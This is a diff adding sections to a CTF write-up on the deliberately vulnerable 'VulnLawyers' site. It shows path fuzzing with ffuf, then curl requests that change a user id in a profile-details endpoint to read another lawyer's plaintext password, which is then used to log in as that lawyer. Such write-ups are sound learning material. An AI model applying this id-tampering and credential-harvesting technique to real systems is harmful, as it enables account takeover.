@@ -6,8 +6,8 @@ metaImg: 'https://ctfchallenge.com/images/ctflogo-trans.png'
 date: '2022-09-14'
 tags:
   - ctf
+  - web
   - writeup
-  - wip
 ---
 
 [[toc]]
@@ -196,5 +196,83 @@ Logging in using browser gives us some info regarding a case, but more
 importantly, the next flag!
 
 ### Some More Digging (Exploitation)
+
+We got a whole new section of the site to explore! Now, it might be worth doing
+some more fuzzing on the path since we've actually been redirected to
+`.../lawyers-only-login` from `.../lawyers-only`, and opening the **Profile
+tab** shows the path `.../lawyers-only-profile`. Thus, we run `ffuf [...]
+http://www.vulnlawyers.co.uk/lawyers-only-FUZZ` while further exploring the new
+domain. Spoiler alert: no interesting results, but good habit nonetheless.
+
+Looking at the **Portal** page shows a list of current cases. There is a single
+case which is managed by *Shayne Cairns*, who is also the only one who can
+perform actions on it. New goal: gain access to their account. Opening the
+source code of the shows nothing interesting.
+
+Taking a closer look at the **Profile** page shows us a place where we can
+update our user data! Immediate thought: could we somehow use this to update
+another user's profile info? Let's take a look at the request payload using the
+**Network** tab in the dev tools.
+
+```
+name=Jaskaran+Lowe&email=jaskaran.lowe%40vulnlawyers.co.uk
+```
+
+Hmm, doesn't seem like it. This leads to finding more info in the request,
+like a new cookie called `token`. Makes sense, these requests have to be
+authenticated, we should include this in any requests we do via the terminal.
+Otherwise, nothing seems unusual.
+
+Perhaps we can find something interesting in the source code. Let's use `curl`
+to retrieve the data.
+```
+$ curl curl http://www.vulnlawyers.co.uk/lawyers-only-profile -H "Cookie: ctfchallenge=<your_ctf_cookie>; token=<your_lawyer_cookie>"
+
+<script>
+    $.getJSON('/lawyers-only-profile-details/4',function(resp){
+        $('input[name="email"]').val( resp.email );
+        $('input[name="name"]').val( resp.name );
+    });
+</script>
+```
+
+Oh would you look at that :glasses:! That's how our info was already filled in!
+For some reason they use some other source than the
+`data.vulnlawyers.co.uk/users` endpoint which we've seen before. Maybe this
+contains different information.
+```
+$ curl http://www.vulnlawyers.co.uk/lawyers-only-profile-details/4 -H "Cookie: ctfchallenge=<your_ctf_cookie>; token=<your_lawyer_cookie>"
+
+{
+  "id": 4,
+  "name": "Jaskaran Lowe",
+  "email": "jaskaran.lowe@vulnlawyers.co.uk",
+  "password": "summer"
+}
+```
+
+Oh yes. Plain old passwords. Of course, they should have used the
+`data.vulnlawyers.co.uk/users` API endpoint to retrieve that data. Let's access
+*Shayne Cairns* profile details with the user `id` which we can find at
+`data.vulnlawyers.co.uk/users`. Small note: that id was zero-indexed (Jaskaran's
+`id` here is `4` while it was `3` before), this one isn't. Compensating for that
+gives the following request.
+```
+$ curl http://www.vulnlawyers.co.uk/lawyers-only-profile-details/2 -H "Cookie: ctfchallenge=<your_ctf_cookie>; token=<your_lawyer_cookie>"
+
+{
+  "id": 2,
+  "name": "Shayne Cairns",
+  "email": "shayne.cairns@vulnlawyers.co.uk",
+  "password": "w&#2a1^3p",
+  "flag": "[^FLAG^NA_AH^FLAG^]"
+}
+```
+Flag number five!
+
+### Finishing Up (Exploitation)
+
+This leaves us to the last flag. We now use the found credentials to log in as
+Shayne Cairns, delete the case, and find the last flag :celebration:.
 
 [^1]: [302 Found](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302)
